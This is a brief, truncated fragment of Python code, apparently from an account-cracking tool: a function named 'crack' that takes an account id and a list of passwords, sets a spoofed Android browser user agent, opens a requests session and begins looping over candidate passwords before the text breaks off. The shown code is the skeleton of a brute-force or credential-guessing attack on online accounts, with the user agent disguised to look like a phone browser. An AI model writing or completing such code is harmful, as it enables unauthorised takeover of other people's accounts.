...
def crack(idf,pwv):
	...
	ua2 = 'Mozilla/5.0 (Linux; U; Android 4.4.4; id-id; HM 1S Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.85 Mobile Safari/537.36 XiaoMi/MiuiBrowser/8.1.4'
	ses = requests.Session()
	for pw in pwv:
		try:
